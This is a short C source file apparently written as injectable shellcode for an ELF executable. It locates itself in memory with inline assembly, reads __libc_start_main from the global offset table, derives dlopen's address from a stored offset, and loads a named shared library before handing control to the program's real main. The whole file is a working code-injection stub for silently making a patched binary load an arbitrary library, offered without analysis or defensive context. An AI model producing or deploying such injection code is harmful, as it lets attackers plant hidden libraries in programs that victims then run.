#include <dlfcn.h>
#define OPCODES_SIZE_UNTIL_INLINE_ASM 34

typedef int(*real_main_function)(int, char*[]);
typedef int(*real_dlopen_function)(const char*, int);

typedef struct ShellcodeArgs {
    long  offset_to_real_main;
    long  offset_to_got_libc_start_main;
    long  offset_from_libc_start_main_to_dlopen;
    char so_name[40];
} ShellcodeArgs;

ShellcodeArgs ARGS;

int main(int argc, char* argv[])
{
    unsigned long start_of_shellcode_address = 0;
    asm("lea (%%rip), %0;": "=r"(start_of_shellcode_address));
    start_of_shellcode_address -= OPCODES_SIZE_UNTIL_INLINE_ASM;


    unsigned long libc_start_main_offset = ((unsigned long*)(start_of_shellcode_address + ARGS.offset_to_got_libc_start_main))[0];
    real_dlopen_function dlopen_function = (real_dlopen_function)(libc_start_main_offset + ARGS.offset_from_libc_start_main_to_dlopen);

    dlopen_function(ARGS.so_name, RTLD_LAZY);

    real_main_function real_main = (real_main_function)(start_of_shellcode_address + ARGS.offset_to_real_main);
    return real_main(argc, argv);
}